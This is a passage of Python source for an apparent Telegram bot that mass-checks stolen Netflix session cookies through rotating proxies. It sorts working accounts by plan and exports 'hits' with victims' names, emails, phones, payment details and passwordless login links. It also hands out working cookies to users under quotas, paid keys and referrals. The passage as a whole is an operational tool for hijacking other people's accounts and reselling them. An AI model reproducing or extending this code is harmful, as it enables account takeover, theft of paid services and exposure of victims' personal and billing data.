                for i, block in enumerate(blocks):
                    clean = extract_netscape_lines(block)
                    if clean:
                        cookie_contents.append((f"block_{i+1}.txt", clean))
            else:
                def extract_zip(zip_path):
                    with zipfile.ZipFile(zip_path, 'r') as zf:
                        items = []
                        for info in zf.infolist():
                            if info.filename.endswith('.txt') and not info.is_dir():
                                with zf.open(info) as f:
                                    content = f.read().decode('utf-8', errors='ignore')
                                    items.append((info.filename, content))
                        return items
                cookie_contents = await asyncio.to_thread(extract_zip, file_path)

            if not cookie_contents:
                await update.effective_message.reply_text(premium_emoji("📭 No cookie files found."), parse_mode='HTML')
                return

            seen_tokens = set()
            unique_cookies = []
            duplicates = 0
            for fname, content in cookie_contents:
                all_cookies = extract_netflix_cookies(content)
                for cookie in all_cookies:
                    nid = cookie.get('NetflixId')
                    if nid and nid not in seen_tokens:
                        seen_tokens.add(nid)
                        unique_cookies.append(nid)
                    elif nid:
                        duplicates += 1

            total_unique = len(unique_cookies)
            if duplicates > 0:
                await update.effective_message.reply_text(
                    premium_emoji(f"📊 Removed {duplicates} duplicate cookies (same token).\n🔍 Checking {total_unique} unique cookies."),
                    parse_mode='HTML'
                )

            if total_unique == 0:
                await update.effective_message.reply_text(premium_emoji("📭 No unique cookies found."), parse_mode='HTML')
                return

            progress_msg = await update.effective_message.reply_text(
                premium_emoji(f"⏳ Checking {total_unique} cookies...\nActive: 0, Expired: 0, Bad: 0, Errors: 0\nProgress: 0/{total_unique}"),
                parse_mode='HTML'
            )

            processed = 0
            active = 0
            expired = 0
            bad = 0
            errors = 0
            added = 0
            on_hold = 0

            used = load_used()
            basic_pool, standard_pool, premium_pool = await get_pool_cached(force=True)
            existing_all = set(basic_pool + standard_pool + premium_pool)

            for nid in unique_cookies:
                processed += 1
                if nid in existing_all or nid in used:
                    bad += 1
                    continue

                valid, info = await asyncio.to_thread(generator.verify_cookie, nid)
                if not valid:
                    bad += 1
                    if info.get('membership_status') == 'INACTIVE' or info.get('hold') == 'Yes':
                        used.add(nid)
                        save_used(used)
                    continue

                if info.get('hold') == 'Yes':
                    on_hold += 1
                    used.add(nid)
                    save_used(used)
                    continue

                streams = info.get('streams', 0)
                try:
                    streams = int(streams)
                except:
                    streams = 0
                if streams == 1:
                    plan_type = 'basic'
                elif streams == 2:
                    plan_type = 'standard'
                else:
                    plan_type = 'premium'

                plan_file = BASIC_FILE if plan_type == 'basic' else STANDARD_FILE if plan_type == 'standard' else PREMIUM_FILE
                async with pool_file_lock:
                    async with aiofiles.open(plan_file, 'a', encoding='utf-8') as f:
                        await f.write(nid + '\n')
                used.add(nid)
                save_used(used)
                existing_all.add(nid)
                added += 1
                active += 1

                if processed % 5 == 0 or processed == total_unique:
                    try:
                        await progress_msg.edit_text(
                            premium_emoji(f"⏳ Checking {total_unique} cookies...\n"
                                          f"Active/Added: {active}, Expired: {expired}, On Hold: {on_hold}, Bad: {bad}, Errors: {errors}\n"
                                          f"Progress: {processed}/{total_unique}"),
                            parse_mode='HTML'
                        )
                    except:
                        pass

                await asyncio.sleep(0.5)

            await get_pool_cached(force=True)
            counts = await get_pool_counts(force=True)

            summary = (
                f"✅ Admin upload complete!\n"
                f"📊 Total unique checked: {total_unique}\n"
                f"📈 Active (added to pool): {added}\n"
                f"⏳ Expired (skipped): {expired}\n"
                f"⏸️ On Hold (skipped): {on_hold}\n"
                f"❌ Invalid/Error: {bad}\n\n"
                f"📊 Updated pool:\n"
                f"  • Basic: {counts['basic']}\n"
                f"  • Standard: {counts['standard']}\n"
                f"  • Premium: {counts['premium']}\n"
                f"  • Total: {counts['basic'] + counts['standard'] + counts['premium']}"
            )
            await progress_msg.edit_text(premium_emoji(summary), parse_mode='HTML')

        except Exception as e:
            log.error(f"Admin upload error: {e}")
            await update.effective_message.reply_text(premium_emoji(f"❌ Upload failed: {str(e)[:200]}"), parse_mode='HTML')
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
        return

# ---------- FEEDBACK PHOTO PROCESSING ----------
async def process_feedback_photo(update: Update, context: ContextTypes.DEFAULT_TYPE, pending: Dict):
    user = update.effective_user
    user_id = str(user.id)
    user_display = f"@{user.username}" if user.username else str(user.id)

    caption = (
        f"📸 **Netflix Feedback**\n"
        f"──────────────────────────\n"
        f"👤 User: `{user_display}`\n"
        f"🆔 ID: `{user.id}`\n"
        f"📋 Command: `{pending['type']}`\n"
        f"📧 Email: `{pending.get('email', 'N/A')}`\n"
        f"📦 Plan: `{pending.get('plan', 'N/A')}`\n"
        f"🕒 Timestamp: `{datetime.fromtimestamp(pending['timestamp']).isoformat()}`"
    )

    if FEEDBACK_CHANNEL:
        try:
            photo_file = update.message.photo[-1].file_id
            await context.bot.send_photo(
                chat_id=FEEDBACK_CHANNEL,
                photo=photo_file,
                caption=caption,
                parse_mode='Markdown'
            )
            await update.message.reply_text("✅ Screenshot forwarded to @dark_feedbacks. Thank you!")
        except Exception as e:
            log.error(f"Failed to send feedback photo: {e}")
            await update.message.reply_text(f"❌ Could not forward screenshot: {str(e)[:100]}")
    else:
        await update.message.reply_text("ℹ️ No feedback channel configured. Your feedback is noted.")
    clear_pending_feedback(user_id)

# ---------- CONFIRM / CANCEL CHECK ----------
async def confirm_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        cookies = user_state.get(user_id, {}).get('cookies', [])
        if not cookies:
            await query.edit_message_text(premium_emoji("❌ No cookies to check. Upload first."), parse_mode='HTML')
            return
        if user_state.get(user_id, {}).get('busy'):
            await query.edit_message_text(premium_emoji("⚠️ Already running!"), parse_mode='HTML')
            return
        users, user = ensure_user(user_id, update.effective_user.username)
        is_prem = is_premium(user)
        is_admin = user.get("is_admin", False)
        if not is_admin and not is_prem:
            if user.get("mass_checked_cookies_today", 0) + len(cookies) > MASS_CHECK_DAILY_COOKIE_LIMIT:
                remaining = max(0, MASS_CHECK_DAILY_COOKIE_LIMIT - user.get("mass_checked_cookies_today", 0))
                await query.edit_message_text(
                    premium_emoji(f"❌ Daily mass check limit reached!\nYou can check {remaining} more cookies today.\nThis file has {len(cookies)} cookies."),
                    parse_mode='HTML'
                )
                return
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = True
        try:
            await query.message.delete()
        except:
            pass
        user_tasks[user_id] = context.application.create_task(
            process_cookies(chat_id, cookies, user_id, context, "check", update.effective_user.username)
        )

async def cancel_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Cancelled.")
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    async with user_locks[user_id]:
        user_state[user_id]['cookies'] = []
        user_state[user_id]['busy'] = False
    try:
        await query.message.delete()
    except:
        pass

# ---------- CLEAN COOKIES PROCESS ----------
async def clean_cookies_process(chat_id, content, user_id, context, filename):
    progress_msg = await context.bot.send_message(chat_id,
        premium_emoji("🧹 Purifying Cookies\n○○○○○  Analyzing..."),
        parse_mode='HTML')
    try:
        cookies = extract_netflix_cookies(content)
        if not cookies:
            await progress_msg.edit_text(premium_emoji("🧹 Purifying Cookies\n○○○○○  ❌ No NetflixId or ct tokens found!"), parse_mode='HTML')
            return

        await progress_msg.edit_text(
            premium_emoji(f"🧹 Purifying Cookies\n●●○○○  Found {len(cookies)} tokens..."),
            parse_mode='HTML')

        seen = set()
        unique = []
        for cookie in cookies:
            h = hashlib.sha256(json.dumps(cookie, sort_keys=True).encode()).hexdigest()
            if h not in seen:
                seen.add(h)
                unique.append(cookie)

        await progress_msg.edit_text(
            premium_emoji(f"🧹 Purifying Cookies\n●●●○○  {len(unique)} unique, creating files..."),
            parse_mode='HTML')

        txt_content = "\n".join([cookie.get('NetflixId', '') for cookie in unique if cookie.get('NetflixId')])
        txt_buffer = io.BytesIO(txt_content.encode('utf-8'))

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for idx, cookie in enumerate(unique, 1):
                ns = dict_to_netscape(cookie)
                zf.writestr(f"cookie_{idx}.txt", ns)

        await progress_msg.edit_text(
            premium_emoji(f"🧹 Purifying Cookies\n●●●●●  Done! {len(unique)} tokens extracted"),
            parse_mode='HTML')

        await context.bot.send_document(
            chat_id,
            document=InputFile(txt_buffer, filename="cleaned_cookies.txt"),
            caption=premium_emoji(f"📄 NetflixId tokens (one per line) – Total: {len(unique)}\n{WATERMARK}"),
            parse_mode='HTML')
        zip_buffer.seek(0)
        await context.bot.send_document(
            chat_id,
            document=InputFile(zip_buffer, filename="cleaned_cookies.zip"),
            caption=premium_emoji(f"📦 Netscape‑format cookie files – Total: {len(unique)}\n{WATERMARK}"),
            parse_mode='HTML')

        await progress_msg.delete()
    except Exception as e:
        await progress_msg.edit_text(premium_emoji(f"🧹 Error: {str(e)}"), parse_mode='HTML')

# ---------- MASS CHECK PROCESS ----------
async def process_cookies(chat_id, cookies, user_id, context, mode, username=None):
    checked, hits, fails, free, holds = 0, 0, 0, 0, 0
    basic_hits, standard_hits, premium_hits = 0, 0, 0
    basic_list, standard_list, premium_list = [], [], []
    total = len(cookies)
    mode_text = "🧊 Account Check"

    global_stats["total_mass_checks"] += 1

    progress_msg = await context.bot.send_message(chat_id,
        premium_emoji(f"{mode_text}\n{'░'*dot_length} 0/{total}\n▸ Hits: 0 (B:0 S:0 P:0) | Holds: 0 | Free: 0 | Fails: 0"),
        parse_mode='HTML', reply_markup=STOP_MARKUP)

    loop = asyncio.get_running_loop()

    try:
        for batch_start in range(0, total, BATCH_SIZE):
            batch = cookies[batch_start:batch_start + BATCH_SIZE]
            async with user_locks[user_id]:
                if user_state.get(user_id, {}).get('stop'):
                    break
            futures = []
            for nm, ck in batch:
                nid = ck.get('NetflixId')
                if not nid:
                    continue
                proxy_str = random.choice(list(proxy_manager.proxies)) if proxy_manager.proxies else None
                proxy_dict = parse_proxy_line(proxy_str) if proxy_str else None
                futures.append(asyncio.wait_for(
                    loop.run_in_executor(GLOBAL_EXECUTOR, verify_cookie_wrapper, nid, proxy_dict),
                    timeout=REQUEST_TIMEOUT+10
                ))
            try:
                results = await asyncio.gather(*futures, return_exceptions=True)
            except asyncio.CancelledError:
                break
            async with user_locks[user_id]:
                if user_state.get(user_id, {}).get('stop'):
                    break

            for result in results:
                checked += 1
                if isinstance(result, Exception):
                    log.error(f"Exception in mass check: {result}")
                    fails += 1
                    continue

                if not result.get('ok'):
                    fails += 1
                    reason = result.get("reason", "")
                    if any(x in reason for x in ["inactive", "login", "redirect"]):
                        nid = result.get("cookie", {}).get("NetflixId")
                        if nid:
                            used = load_used()
                            used.add(nid)
                            save_used(used)
                    continue

                if result.get("premium"):
                    streams = result.get("max_streams")
                    if streams is None or streams == "Unknown":
                        streams = 0
                    try:
                        streams = int(streams)
                    except:
                        streams = 0

                    if result.get("on_payment_hold") == "Yes":
                        holds += 1
                    else:
                        hits += 1
                        if streams == 1:
                            basic_hits += 1
                            basic_list.append(result)
                        elif streams == 2:
                            standard_hits += 1
                            standard_list.append(result)
                        else:
                            premium_hits += 1
                            premium_list.append(result)
                else:
                    free += 1

            progress = checked / total if total > 0 else 0
            filled = int(progress * dot_length)
            bar = '▓' * filled + '░' * (dot_length - filled)
            text = (f"{mode_text}\n{bar} {checked}/{total}\n"
                    f"▸ Hits: {hits} (B:{basic_hits} S:{standard_hits} P:{premium_hits}) | Holds: {holds} | Free: {free} | Fails: {fails}")
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=progress_msg.message_id,
                    text=premium_emoji(text), parse_mode='HTML', reply_markup=STOP_MARKUP)
            except:
                pass
            await asyncio.sleep(BATCH_DELAY)

    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    finally:
        user_state[user_id]['basic_list'] = basic_list
        user_state[user_id]['standard_list'] = standard_list
        user_state[user_id]['premium_list'] = premium_list
        user_state[user_id]['basic_hits'] = basic_hits
        user_state[user_id]['standard_hits'] = standard_hits
        user_state[user_id]['premium_hits'] = premium_hits

        async with user_locks[user_id]:
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = False
            if user_id in user_tasks:
                del user_tasks[user_id]

        await cleanup_user(user_id)

        users, user = ensure_user(user_id, username)
        if not user.get("is_admin", False) and not is_premium(user):
            user["mass_checked_cookies_today"] = user.get("mass_checked_cookies_today", 0) + total
            save_users(users)

        try:
            await progress_msg.delete()
        except:
            pass
        await context.bot.send_message(chat_id, premium_emoji("✅ Processing complete!"), parse_mode='HTML')

    if user_state.get(user_id, {}).get('stop'):
        await context.bot.send_message(chat_id, premium_emoji("⏹️ Stopped by user. No result files will be sent."), parse_mode='HTML')
        return

    all_hits = basic_list + standard_list + premium_list
    if all_hits:
        token_tasks = []
        for hit in all_hits:
            nid = hit.get('cookie', {}).get('NetflixId')
            if nid:
                token_tasks.append(get_cached_token(nid))
            else:
                token_tasks.append(asyncio.sleep(0, result=None))
        tokens = await asyncio.gather(*token_tasks)
        for hit, token in zip(all_hits, tokens):
            if token:
                hit['_token'] = token

    try:
        if basic_list or standard_list or premium_list:
            files_to_send = []

            def safe_build(cookie_list, label):
                content_parts = []
                for i, dd in enumerate(cookie_list, 1):
                    try:
                        content_parts.append(build_export_str(dd, i))
                    except Exception as e:
                        log.error(f"Failed to build {label} cookie {i}: {e}")
                        content_parts.append(f"========== HIT #{i} (ERROR) ==========\nError: {str(e)[:100]}")
                return "\n\n".join(content_parts) if content_parts else None

            if basic_list:
                content = safe_build(basic_list, "Basic")
                if content:
                    files_to_send.append(("Basic_Hits.txt", content))
            if standard_list:
                content = safe_build(standard_list, "Standard")
                if content:
                    files_to_send.append(("Standard_Hits.txt", content))
            if premium_list:
                content = safe_build(premium_list, "Premium")
                if content:
                    files_to_send.append(("Premium_Hits.txt", content))

            all_hits_for_export = basic_list + standard_list + premium_list
            if all_hits_for_export:
                content = safe_build(all_hits_for_export, "All")
                if content:
                    files_to_send.append(("All_Hits.txt", content))

            total_size = sum(len(c) for _, c in files_to_send)
            if total_size > 1024 * 1024:
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for fname, content in files_to_send:
                        zf.writestr(fname, content.encode('utf-8'))
                zip_buffer.seek(0)
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=InputFile(zip_buffer, filename="Hits.zip"),
                    caption=premium_emoji(f"📦 All hits (compressed)\n{WATERMARK}"),
                    parse_mode='HTML'
                )
            else:
                for fname, content in files_to_send:
                    try:
                        buf = io.BytesIO(content.encode('utf-8'))
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(buf, filename=fname),
                            caption=premium_emoji(f"{WATERMARK}"),
                            parse_mode='HTML'
                        )
                    except Exception as e:
                        log.error(f"Failed to send {fname}: {e}")
                        await context.bot.send_message(chat_id, premium_emoji(f"⚠️ Could not send {fname} – {str(e)[:100]}"), parse_mode='HTML')

            summary_msg = (
                f"✅ Mass check complete!\n\n"
                f"Checked: {checked}\n"
                f"Hits (Premium): {hits}\n"
                f"  • Basic: {basic_hits}\n"
                f"  • Standard: {standard_hits}\n"
                f"  • Premium: {premium_hits}\n"
                f"Holds: {holds}\n"
                f"Free: {free}\n"
                f"Failed: {fails}\n\n"
                f"📤 Sent {len(files_to_send)} files."
            )

            await context.bot.send_message(chat_id, premium_emoji(summary_msg), parse_mode='HTML')

            # ----- CLEANUP -----
            user_state[user_id].pop('basic_list', None)
            user_state[user_id].pop('standard_list', None)
            user_state[user_id].pop('premium_list', None)
            user_state[user_id]['cookies'] = []
            import gc
            gc.collect()

        else:
            msg = (f"✅ Done!\n\nChecked: {checked}\n"
                   f"Hits: 0\nHolds: {holds}\nFree: {free}\nFailed: {fails}\n\n"
                   "❌ No premium hits found.")
            await context.bot.send_message(chat_id, premium_emoji(msg), parse_mode='HTML')
    except Exception as e:
        log.error(f"Critical error while sending results: {e}")
        await context.bot.send_message(
            chat_id,
            premium_emoji(f"⚠️ Error sending results: {str(e)[:200]}\nCheck completed: {checked} cookies, {hits} hits."),
            parse_mode='HTML'
        )

# ---------- TOKEN CACHE ----------
async def get_cached_token(netflix_id: str) -> Optional[str]:
    await cleanup_token_cache()
    async with TOKEN_CACHE_LOCK:
        if netflix_id in TOKEN_CACHE:
            token, expires = TOKEN_CACHE[netflix_id]
            if time.time() < expires:
                return token
            else:
                del TOKEN_CACHE[netflix_id]
    loop = asyncio.get_running_loop()
    token = await loop.run_in_executor(GLOBAL_EXECUTOR, get_fresh_token, netflix_id)
    if token:
        async with TOKEN_CACHE_LOCK:
            if len(TOKEN_CACHE) >= TOKEN_CACHE_MAX_SIZE:
                sorted_items = sorted(TOKEN_CACHE.items(), key=lambda x: x[1][1])
                for k, _ in sorted_items[:len(TOKEN_CACHE) - TOKEN_CACHE_MAX_SIZE + 1]:
                    del TOKEN_CACHE[k]
            TOKEN_CACHE[netflix_id] = (token, time.time() + TOKEN_CACHE_TTL)
    return token

def get_fresh_token(netflix_id: str) -> Optional[str]:
    try:
        cookies, _ = generator.get_cookies_and_info(netflix_id)
        if cookies:
            ios_result, err = generate_nftoken_ios(cookies)
            if ios_result:
                return ios_result['token']
    except Exception:
        pass
    return None

# ---------- VERIFY COOKIE WRAPPER ----------
def verify_cookie_wrapper(nid, proxy):
    max_attempts = 2
    base_delay = 2
    last_error = None
    for attempt in range(max_attempts):
        try:
            valid, info = generator.verify_cookie(nid, proxy=proxy)
            if not valid and info.get('membership_status') == 'INACTIVE':
                return {'ok': False, 'reason': 'Account inactive', 'cookie': {'NetflixId': nid}}
            if not valid and info.get('reason') and 'Redirected to login' in info.get('reason', ''):
                return {'ok': False, 'reason': 'Redirected to login', 'cookie': {'NetflixId': nid}}
            if not valid:
                last_error = info.get('reason', 'Unknown error')
                if attempt < max_attempts - 1:
                    time.sleep(base_delay * (attempt + 1))
                    continue
                else:
                    return {'ok': False, 'reason': f'Failed after retries: {last_error}', 'cookie': {'NetflixId': nid}}
            result = {
                'ok': True,
                'premium': bool(info.get('plan_nombre', '') and 'free' not in info.get('plan_nombre', '').lower()),
                'name': info.get('name', 'Unknown'),
                'country': info.get('pais', 'Unknown'),
                'plan': info.get('plan_nombre', 'Unknown'),
                'plan_price': info.get('price', 'Unknown'),
                'member_since': info.get('member_since', 'Unknown'),
                'next_billing': info.get('renovacion_fecha', 'Unknown'),
                'payment_method': info.get('payment_method', 'Unknown'),
                'masked_card': 'Unknown',
                'phone': info.get('phone', 'Unknown'),
                'phone_verified': info.get('phone_verified', 'Unknown'),
                'video_quality': info.get('quality', 'Unknown'),
                'max_streams': info.get('streams', 'Unknown'),
                'on_payment_hold': info.get('hold', 'No'),
                'extra_member': info.get('extra_member', 'Unknown'),
                'email_verified': info.get('email_verified', 'Unknown'),
                'email': info.get('email', 'Unknown'),
                'profiles': info.get('profiles', 'Unknown'),
                'user_guid': info.get('user_guid', 'Unknown'),
                'membership_status': info.get('membership_status', 'CURRENT_MEMBER' if info.get('plan_nombre') else 'Unknown'),
                'cookie': {'NetflixId': nid},
                '_token': info.get('_token', None)
            }
            return result
        except Exception as e:
            last_error = str(e)
            if attempt < max_attempts - 1:
                time.sleep(base_delay * (attempt + 1))
                continue
    return {'ok': False, 'reason': f'Max retries exceeded: {last_error}', 'cookie': {'NetflixId': nid}}

# ---------- STOP ----------
async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("Stopped!")
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    async with user_locks[user_id]:
        if user_id in user_tasks:
            user_tasks[user_id].cancel()
        user_state[user_id]['busy'] = False
        user_state[user_id]['stop'] = True
        try:
            await query.message.delete()
        except:
            pass

# ---------- EXPORT STRING ----------
def build_export_str(dd, idx):
    d = [f"========== HIT #{idx} =========="]
    cookie = dd.get('cookie', {})
    token = dd.get('_token')
    login_link = f"https://netflix.com/?nftoken={token}" if token else "N/A"

    for key, label in [('name','Name'),('email','Email'),('country','Country'),
                        ('plan','Plan'),('plan_price','Plan Price'),('member_since','Member Since'),
                        ('next_billing','Next Billing'),('payment_method','Payment'),('masked_card','Card'),
                        ('phone','Phone'),('phone_verified','Phone Verified'),('email_verified','Email Verified'),
                        ('video_quality','Quality'),('max_streams','Streams'),('on_payment_hold','On Hold'),
                        ('extra_member','Extra Member'),('membership_status','Status'),('profiles','Profiles'),
                        ('user_guid','GUID')]:
        val = dd.get(key, 'Unknown')
        val = clean_text(val)
        d.append(f"{label}: {safe_html(val)}")
    cd = dd.get('cookie', {})
    ns = dict_to_netscape(cd) if isinstance(cd, dict) else str(cd)
    d.append(f"Login Link: {login_link}")
    return "\n".join(d) + "\n\nNetscape Cookie ↓\n" + ns + f"\n\n{WATERMARK}"

# ---------- /get (NON-BLOCKING) ----------
async def get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return

    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    used = load_used()
    basic_pool, standard_pool, premium_pool = await get_pool_cached()
    is_admin = user.get("is_admin", False)
    is_prem = is_premium(user)
    today = datetime.now().strftime("%Y-%m-%d")
    if user["last_claim_date"] != today:
        user["last_claim_date"] = today
        user["claimed_basic_today"] = 0
        user["claimed_standard_today"] = 0
        user["claimed_premium_today"] = 0

    if is_admin:
        allowed_plans = {"basic": PREMIUM_LIMIT, "standard": PREMIUM_LIMIT, "premium": PREMIUM_LIMIT}
        pool_map = {
            "basic": ([c for c in basic_pool if c not in used], "Basic", "basic"),
            "standard": ([c for c in standard_pool if c not in used], "Standard", "standard"),
            "premium": ([c for c in premium_pool if c not in used], "Premium", "premium")
        }
    elif is_prem:
        allowed_plans = {"basic": FREE_BASIC_LIMIT, "standard": FREE_STANDARD_LIMIT, "premium": PREMIUM_LIMIT}
        pool_map = {
            "basic": ([c for c in basic_pool if c not in used], "Basic", "basic"),
            "standard": ([c for c in standard_pool if c not in used], "Standard", "standard"),
            "premium": ([c for c in premium_pool if c not in used], "Premium", "premium")
        }
    else:
        allowed_plans = {"basic": FREE_BASIC_LIMIT, "standard": FREE_STANDARD_LIMIT, "premium": FREE_PREMIUM_LIMIT}
        pool_map = {
            "basic": ([c for c in basic_pool if c not in used], "Basic", "basic"),
            "standard": ([c for c in standard_pool if c not in used], "Standard", "standard"),
            "premium": ([c for c in premium_pool if c not in used], "Premium", "premium")
        }

    args = context.args
    requested_plan = args[0].lower() if args and args[0].lower() in allowed_plans else None

    if not requested_plan:
        if is_admin or is_prem:
            requested_plan = "premium"
        else:
            if user["claimed_basic_today"] < FREE_BASIC_LIMIT:
                requested_plan = "basic"
            elif user["claimed_standard_today"] < FREE_STANDARD_LIMIT:
                requested_plan = "standard"
            elif user["claimed_premium_today"] < FREE_PREMIUM_LIMIT:
                requested_plan = "premium"
            else:
                await update.effective_message.reply_text(
                    premium_emoji("❌ You have used all your free cookies today.\nUse /referral to earn Premium cookies."),
                    parse_mode='HTML'
                )
                return

    if requested_plan not in allowed_plans:
        await update.effective_message.reply_text(premium_emoji(f"❌ You are not allowed to use {requested_plan} plan."), parse_mode='HTML')
        return

    quota_field = f"claimed_{requested_plan}_today"
    if is_admin:
        pass
    elif is_prem:
        if requested_plan == "premium":
            if user.get("premium_get_quota", 0) <= 0:
                await update.effective_message.reply_text(premium_emoji("❌ Your premium get quota is exhausted. Redeem a new key."), parse_mode='HTML')
                return
        else:
            if user.get(quota_field, 0) >= allowed_plans[requested_plan]:
                await update.effective_message.reply_text(premium_emoji(f"❌ You have reached your daily limit for {requested_plan} plan."), parse_mode='HTML')
                return
    else:
        limit = allowed_plans[requested_plan]
        if user.get(quota_field, 0) >= limit:
            await update.effective_message.reply_text(premium_emoji(f"❌ You have reached your daily limit for {requested_plan} plan."), parse_mode='HTML')
            return

    pool, pool_name, plan_type = pool_map[requested_plan]
    if not pool:
        await update.effective_message.reply_text(premium_emoji(f"❌ No {pool_name} cookies available in the pool."), parse_mode='HTML')
        return

    random.shuffle(pool)
    working_id = None
    working_token = None
    working_info = {}
    total = len(pool)

    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=premium_emoji(f"⏳ Testing cookies... (0/{total})"),
        parse_mode='HTML'
    )

    loop = asyncio.get_running_loop()
    BATCH_TEST_SIZE = 4
    BATCH_TIMEOUT = 40

    for start in range(0, total, BATCH_TEST_SIZE):
        batch = pool[start:start + BATCH_TEST_SIZE]
        if working_id:
            break
        # ---- FIX: all verify_cookie calls offloaded to executor ----
        tasks = [loop.run_in_executor(GLOBAL_EXECUTOR, generator.verify_cookie, nid) for nid in batch]

        try:
            results = await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=BATCH_TIMEOUT
            )
        except asyncio.TimeoutError:
            for nid in batch:
                used.add(nid)
            save_used(used)
            await status_msg.edit_text(
                premium_emoji(f"⏳ Testing cookies... ({min(start + BATCH_TEST_SIZE, total)}/{total}) [timeout]"),
                parse_mode='HTML'
            )
            continue

        for nid, result in zip(batch, results):
            if isinstance(result, Exception):
                used.add(nid)
                save_used(used)
                continue
            valid, info = result
            if valid and info.get('hold') != 'Yes':
                # ---- FIX: second verification and token generation offloaded ----
                fresh_valid, fresh_info = await loop.run_in_executor(GLOBAL_EXECUTOR, generator.verify_cookie, nid)
                if fresh_valid and fresh_info.get('hold') != 'Yes':
                    working_token = fresh_info.get('_token')
                    if not working_token:
                        # Attempt to generate token – offloaded
                        cookies, _ = await loop.run_in_executor(GLOBAL_EXECUTOR, generator.get_cookies_and_info, nid)
                        if cookies:
                            ios_result, _ = await loop.run_in_executor(GLOBAL_EXECUTOR, generate_nftoken_ios, cookies)
                            if ios_result:
                                working_token = ios_result['token']
                    if working_token:
                        working_id = nid
                        working_info = fresh_info
                        break
                    else:
                        used.add(nid)
                        save_used(used)
                else:
                    used.add(nid)
                    save_used(used)
            else:
                if not valid or info.get('hold') == 'Yes':
                    used.add(nid)
                    save_used(used)

        try:
            await status_msg.edit_text(
                premium_emoji(f"⏳ Testing cookies... ({min(start + BATCH_TEST_SIZE, total)}/{total})"),
                parse_mode='HTML'
            )
        except:
            pass

    if not working_id:
        await status_msg.edit_text(
            premium_emoji(f"❌ No working {pool_name} cookies found after testing {total} cookies."),
            parse_mode='HTML'
        )
        return

    used.add(working_id)
    save_used(used)

    if is_admin:
        pass
    elif is_prem:
        if requested_plan == "premium":
            user["premium_get_quota"] -= 1
        else:
            user[quota_field] = user.get(quota_field, 0) + 1
    else:
        user[quota_field] = user.get(quota_field, 0) + 1
    user["claimed_total"] += 1
    save_users(users)

    output = format_output(working_token, working_info, working_id)
    used_today = user["claimed_basic_today"] + user["claimed_standard_today"] + user["claimed_premium_today"]
    remaining = user["premium_get_quota"] if is_prem else "N/A"

    if not is_admin:
        set_pending_feedback(user_id, "get", working_id, requested_plan, clean_text(working_info.get('email', '')), update.effective_user.username)
        final_msg = (
            f"🍪 Working {pool_name} cookie!\n"
            f"Used today: {used_today}/{FREE_BASIC_LIMIT + FREE_STANDARD_LIMIT + FREE_PREMIUM_LIMIT}\n"
            f"Premium get quota remaining: {remaining}\n\n"
            f"{output}\n\n"
            f"📸 **Please send a screenshot** of the Netflix home page (logged in) to confirm this cookie works.\n"
            f"You have **{FEEDBACK_TIMEOUT_MINUTES} minutes** to send it.\n"
            f"Until then, you can only use `/nfcheck`."
        )
    else:
        final_msg = (
            f"🍪 Working {pool_name} cookie!\n"
            f"Used today: {used_today}/{FREE_BASIC_LIMIT + FREE_STANDARD_LIMIT + FREE_PREMIUM_LIMIT}\n"
            f"Premium get quota remaining: {remaining}\n\n"
            f"{output}"
        )

    await status_msg.edit_text(premium_emoji(final_msg), parse_mode='HTML')

# ---------- PREMIUM STATUS ----------
async def premium_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    user_id = str(update.effective_user.id)
    _, user = ensure_user(user_id, update.effective_user.username)
    if is_premium(user):
        expiry = datetime.fromtimestamp(user["premium_expiry"]).strftime("%Y-%m-%d %H:%M UTC")
        check_q = user.get("premium_check_quota", 0)
        get_q = user.get("premium_get_quota", 0)
        pending = user.get("pending_premium", 0)
        await update.effective_message.reply_text(
            premium_emoji(f"✅ Premium active until {expiry}\nCheck quota: {check_q}\nGet quota: {get_q}\nPending referrals: {pending}\nUse /claim to redeem pending referrals."),
            parse_mode='HTML'
        )
    else:
        pending = user.get("pending_premium", 0)
        await update.effective_message.reply_text(
            premium_emoji(f"❌ Not premium.\nPending referrals: {pending}\nUse /redeem <key> to upgrade or /claim to redeem pending referrals."),
            parse_mode='HTML'
        )

# ---------- REDEEM ----------
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    if not context.args:
        await update.effective_message.reply_text(premium_emoji("Usage: /redeem KEY"), parse_mode='HTML')
        return
    key = context.args[0].strip()
    keys = load_keys()
    if key not in keys:
        await update.effective_message.reply_text(premium_emoji("❌ Invalid key."), parse_mode='HTML')
        return
    key_data = keys[key]
    if key_data["remaining_uses"] <= 0:
        await update.effective_message.reply_text(premium_emoji("❌ This key has been fully used."), parse_mode='HTML')
        return
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    check_quota = key_data["check_quota"]
    get_quota = key_data["get_quota"]
    duration = key_data["duration_hours"]
